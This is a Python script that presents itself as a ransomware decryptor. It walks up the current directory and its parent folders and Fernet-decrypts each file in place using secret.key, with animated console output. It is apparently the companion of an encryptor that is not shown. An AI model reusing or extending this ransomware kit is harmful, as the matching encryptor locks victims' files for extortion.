from cryptography.fernet import Fernet
import os
import time

# ========== Animation ==========

def type_line(text, delay=0.3):
    words = text.split()
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(delay)
    print()

def blink_dots(duration=4):
    end_time = time.time() + duration
    dots = ["   ", ".  ", ".. ", "..."]
    while time.time() < end_time:
        for d in dots:
            print(f"\rprocessing{d}", end='', flush=True)
            time.sleep(0.4)
    print("\r" + " " * 20 + "\r", end='')  # Clear line

# ========== Key Loader ==========

def load_key():
    try:
        return open("secret.key", "rb").read()
    except FileNotFoundError:
        print("[!] secret.key file not found!")
        exit()

# ========== Decrypt File ==========

def decrypt_file(file_path, fernet):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        decrypted = fernet.decrypt(data)
        with open(file_path, "wb") as f:
            f.write(decrypted)
        print(f"[+] Decrypted: {file_path}")
    except Exception as e:
        print(f"[!] Failed: {file_path} ({e})")

# ========== Decrypt Directories ==========

def decrypt_directory(path, fernet, skip_files):
    for foldername, subfolders, filenames in os.walk(path):
        for filename in filenames:
            if filename in skip_files:
                continue
            file_path = os.path.join(foldername, filename)
            decrypt_file(file_path, fernet)

def get_parent_directories(path):
    path = os.path.abspath(path)
    parts = path.split(os.sep)
    directories = []

    for i in range(3, len(parts) + 1):  # Skip root, home, username
        current_path = os.sep.join(parts[:i])
        if current_path:
            directories.append(current_path)

    return directories

# ========== Main ==========

def main():
    type_line("ransomware decryptor started...", delay=0.3)

    key = load_key()
    print("[*] Key loaded.")

    fernet = Fernet(key)

    current_dir = os.getcwd()
    target_paths = get_parent_directories(current_dir)

    script_name = os.path.basename(__file__)
    skip_files = {"secret.key", "decrypt.py", "encrypt.py"}

    blink_dots(duration=4)

    for path in target_paths:
        decrypt_directory(path, fernet, skip_files)

    type_line("decrypt operation completed successfully...", delay=0.2)

if __name__ == "__main__":
    main()

